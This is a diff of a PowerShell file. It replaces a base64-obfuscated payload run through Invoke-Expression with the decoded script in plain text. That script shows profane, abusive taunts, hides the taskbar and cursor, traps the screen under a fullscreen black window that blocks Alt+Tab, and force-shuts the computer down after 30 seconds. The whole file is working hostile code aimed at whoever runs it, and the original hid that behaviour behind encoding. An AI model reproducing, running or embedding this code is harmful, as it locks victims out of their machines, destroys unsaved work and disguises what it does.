@@ -1,3 +1,71 @@
-$payload = 'IyBTZXQgVVRGOCBvdXRwdXQgYW5kIHRpdGxlDQpbQ29uc29sZV06Ok91dHB1dEVuY29kaW5nID0gW1N5c3RlbS5UZXh0LkVuY29kaW5nXTo6VVRGOA0KJEhvc3QuVUkuUmF3VUkuV2luZG93VGl0bGUgPSAiUGFuZWxGdWNrZXItQEZBSVJ4IENPTU1VTklUWSINCg0KZnVuY3Rpb24gV3JpdGUtUm9hc3RMaW5lIHsNCiAgICBwYXJhbShbc3RyaW5nXSRtc2cpDQogICAgV3JpdGUtSG9zdCAkbXNnIC1Gb3JlZ3JvdW5kQ29sb3IgUmVkDQogICAgU3RhcnQtU2xlZXAgLU1pbGxpc2Vjb25kcyA4MDANCn0NCg0KY2xzDQpXcml0ZS1Sb2FzdExpbmUgIj09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09Ig0KV3JpdGUtUm9hc3RMaW5lICIgIFNZU1RFTSBCUkVBQ0ggREVURUNURUQgLSBOSUNFIFRSWSBZT1UgTE9XLUxJRkUgQ0xPV04gICAgICAgICINCldyaXRlLVJvYXN0TGluZSAiPT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT0iDQpTdGFydC1TbGVlcCAtU2Vjb25kcyAxDQoNCldyaXRlLVJvYXN0TGluZSAiYG5BYWFhIGJpdGNoLi4uIHlvdSB0aG91Z2h0IHlvdSBjb3VsZCBydW4gdGhpcyBmb3IgeW91ciBwcm9maXQsIGh1aD8iDQpXcml0ZS1Sb2FzdExpbmUgIkRpZG4ndCBJIHdhcm4geW91IG5vdCB0byBtZXNzIHdpdGggeW91ciBEQUQgbGFzdCB0aW1lPyINCldyaXRlLVJvYXN0TGluZSAiTm93IGZhY2UgdGhlIGNvbnNlcXVlbmNlcyB5b3UgbGlsIGFzc2hvbGUuIg0KU3RhcnQtU2xlZXAgLVNlY29uZHMgMQ0KDQpXcml0ZS1Sb2FzdExpbmUgImBuVG8geW91ciBkZXZzOiBHbyBsZWFybiBBQkNEIGJlZm9yZSBtYWtpbmcgYSBwYW5lbCwgZHVtYmFzc2VzLiINClN0YXJ0LVNsZWVwIC1TZWNvbmRzIDINCg0KIyBBZGQgV2luZG93cyBGb3Jtcw0KQWRkLVR5cGUgLUFzc2VtYmx5TmFtZSBTeXN0ZW0uV2luZG93cy5Gb3Jtcw0KQWRkLVR5cGUgLUFzc2VtYmx5TmFtZSBTeXN0ZW0uRHJhd2luZw0KDQojIEhpZGUgdGFza2JhciB1c2luZyB1c2VyMzIuZGxsIChTaGVsbF9UcmF5V25kKQ0KQWRkLVR5cGUgQCINCnVzaW5nIFN5c3RlbTsNCnVzaW5nIFN5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlczsNCnB1YmxpYyBjbGFzcyBUYXNrYmFyIHsNCiAgICBbRGxsSW1wb3J0KCJ1c2VyMzIuZGxsIildDQogICAgcHVibGljIHN0YXRpYyBleHRlcm4gaW50IEZpbmRXaW5kb3coc3RyaW5nIGNsYXNzTmFtZSwgc3RyaW5nIHdpbmRvd1RleHQpOw0KICAgIFtEbGxJbXBvcnQoInVzZXIzMi5kbGwiKV0NCiAgICBwdWJsaWMgc3RhdGljIGV4dGVybiBpbnQgU2hvd1dpbmRvdyhpbnQgaHduZCwgaW50IGNvbW1hbmQpOw0KfQ0KIkANCg0KIyBIaWRlIHRoZSB0YXNrYmFyIChTV19ISURFID0gMCkNCiR0YXNrYmFyID0gW1Rhc2tiYXJdOjpGaW5kV2luZG93KCJTaGVsbF9UcmF5V25kIiwgIiIpDQpbVGFza2Jhcl06OlNob3dXaW5kb3coJHRhc2tiYXIsIDApDQoNCiMgQ3JlYXRlIGZ1bGwgYmxhY2sgc2NyZWVuDQokZm9ybSA9IE5ldy1PYmplY3QgV2luZG93cy5Gb3Jtcy5Gb3JtDQokZm9ybS5XaW5kb3dTdGF0ZSA9ICdNYXhpbWl6ZWQnDQokZm9ybS5Gb3JtQm9yZGVyU3R5bGUgPSAnTm9uZScNCiRmb3JtLlRvcE1vc3QgPSAkdHJ1ZQ0KJGZvcm0uQmFja0NvbG9yID0gJ0JsYWNrJw0KJGZvcm0uT3BhY2l0eSA9IDENCiRmb3JtLlNob3dJblRhc2tiYXIgPSAkZmFsc2UNCltTeXN0ZW0uV2luZG93cy5Gb3Jtcy5DdXJzb3JdOjpIaWRlKCkNCg0KIyBUaW1lciB0byBzaHV0ZG93biBhZnRlciAzMCBzZWNvbmRzDQokdGltZXIgPSBOZXctT2JqZWN0IFdpbmRvd3MuRm9ybXMuVGltZXINCiR0aW1lci5JbnRlcnZhbCA9IDMwMDAwDQokdGltZXIuQWRkX1RpY2soew0KICAgICR0aW1lci5TdG9wKCkNCg0KICAgICMgUmVzdG9yZSB0YXNrYmFyDQogICAgW1Rhc2tiYXJdOjpTaG93V2luZG93KCR0YXNrYmFyLCAxKQ0KDQogICAgU3RvcC1Db21wdXRlciAtRm9yY2UNCn0pDQoNCiR0aW1lci5TdGFydCgpDQoNCiMgU2hvdyB0aGUgYmxhY2sgc2NyZWVuIGluIG1vZGFsIG1vZGUgKHRyYXBzIEFMVCtUQUIpDQokZm9ybS5TaG93RGlhbG9nKCkNCg==';
-$decoded = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($payload));
-Invoke-Expression $decod
+# Set UTF8 output and title
+[Console]::OutputEncoding = [System.Text.Encoding]::UTF8
+$Host.UI.RawUI.WindowTitle = "PanelFucker-@FAIRx COMMUNITY"
+
+function Write-RoastLine {
+    param([string]$msg)
+    Write-Host $msg -ForegroundColor Red
+    Start-Sleep -Milliseconds 800
+}
+
+cls
+Write-RoastLine "=============================================================="
+Write-RoastLine "  SYSTEM BREACH DETECTED - NICE TRY YOU LOW-LIFE CLOWN        "
+Write-RoastLine "=============================================================="
+Start-Sleep -Seconds 1
+
+Write-RoastLine "`nAaaa bitch... you thought you could run this for your profit, huh?"
+Write-RoastLine "Didn't I warn you not to mess with your DAD last time?"
+Write-RoastLine "Now face the consequences you lil asshole."
+Start-Sleep -Seconds 1
+
+Write-RoastLine "`nTo your devs: Go learn ABCD before making a panel, dumbasses."
+Start-Sleep -Seconds 2
+
+# Add Windows Forms
+Add-Type -AssemblyName System.Windows.Forms
+Add-Type -AssemblyName System.Drawing
+
+# Hide taskbar using user32.dll (Shell_TrayWnd)
+Add-Type @"
+using System;
+using System.Runtime.InteropServices;
+public class Taskbar {
+    [DllImport("user32.dll")]
+    public static extern int FindWindow(string className, string windowText);
+    [DllImport("user32.dll")]
+    public static extern int ShowWindow(int hwnd, int command);
+}
+"@
+
+# Hide the taskbar (SW_HIDE = 0)
+$taskbar = [Taskbar]::FindWindow("Shell_TrayWnd", "")
+[Taskbar]::ShowWindow($taskbar, 0)
+
+# Create full black screen
+$form = New-Object Windows.Forms.Form
+$form.WindowState = 'Maximized'
+$form.FormBorderStyle = 'None'
+$form.TopMost = $true
+$form.BackColor = 'Black'
+$form.Opacity = 1
+$form.ShowInTaskbar = $false
+[System.Windows.Forms.Cursor]::Hide()
+
+# Timer to shutdown after 30 seconds
+$timer = New-Object Windows.Forms.Timer
+$timer.Interval = 30000
+$timer.Add_Tick({
+    $timer.Stop()
+
+    # Restore taskbar
+    [Taskbar]::ShowWindow($taskbar, 1)
+
+    Stop-Computer -Force
+})
+
+$timer.Start()
+
+# Show the black screen in modal mode (traps ALT+TAB)
+$form.ShowDialog()
+
